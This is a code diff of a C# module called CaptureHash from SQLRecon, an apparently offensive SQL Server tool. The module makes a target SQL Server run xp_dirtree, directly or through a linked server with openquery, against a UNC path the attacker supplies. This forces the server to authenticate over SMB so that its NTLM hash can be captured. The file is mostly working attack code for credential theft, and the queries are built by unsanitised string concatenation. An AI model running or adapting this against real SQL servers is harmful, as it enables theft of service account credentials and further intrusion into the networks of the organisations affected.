@@ -1,24 +1,25 @@
-﻿using System;
-using System.Data.SqlClient;
+﻿using System.Data.SqlClient;
 
 namespace SQLRecon.Modules
 {
-    public class SMB
+    internal class CaptureHash
     {
-        SQLQuery sqlQuery = new SQLQuery();
+        private static readonly SqlQuery _sqlQuery = new();
 
-        // this takes a file share (\\ip\share) and requests the share directly from the sql server
-        public void CaptureHash(SqlConnection con, String share)
+        /// <summary>
+        /// This constructor will instruct the remote SQL server to solicit
+        /// a SMB reqeuest to a supplied UNC path.
+        /// </summary>
+        /// <param name="con">Connection to SQL Server</param>
+        /// <param name="smbShare">The user supplied UNC path</param>
+        /// <param name="linkedSQLServer">A Linked SQL Server, if specified</param>
+        public CaptureHash(SqlConnection con, string smbShare, string linkedSQLServer = "null")
         {
-            string sqlOutput = "";
-            sqlOutput = sqlQuery.ExecuteCustomQuery(con,"EXEC master..xp_dirtree \"" + share + "\";");
-        }
 
-        // this takes a file share (\\ip\share) and requests the share from the linked ssql server
-        public void CaptureLinkedHash(SqlConnection con, String linkedSQLServer, String share)
-        {
-            string sqlOutput = "";
-            sqlOutput = sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + "\", 'SELECT 1; EXEC master..xp_dirtree \"" + share + "\";')");
+            _ = (linkedSQLServer.Equals("null")) 
+                ? _sqlQuery.ExecuteCustomQuery(con, "EXEC master..xp_dirtree \"" + smbShare + "\";")
+                : _sqlQuery.ExecuteCustomQuery(con, "select * from openquery(\"" + linkedSQLServer + 
+                "\", 'SELECT 1; EXEC master..xp_dirtree \"" + smbShare + "\";')");
         }
     }
 }
